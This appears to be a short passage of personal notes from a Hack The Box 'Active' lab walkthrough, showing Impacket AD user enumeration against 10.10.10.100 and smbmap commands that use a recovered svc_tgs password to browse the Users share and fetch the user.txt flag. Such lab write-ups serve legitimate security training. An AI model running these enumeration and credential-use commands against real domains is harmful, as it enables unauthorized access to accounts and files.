## Getting AD Users

```bash
$ impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 16:06:40.351723  2021-01-21 13:07:03.723783 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 15:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 17:14:38.402764  2018-07-21 11:01:30.320277
```

## Enumerating with user svc_tgs

![[Pasted image 20211124112053.png]]

### Path Users

```bash
$ smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users
```
![[Pasted image 20211124112440.png]]

### Getting flag user.txt

```bash
$ smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt
```
![[Pasted image 20211124112752.png]]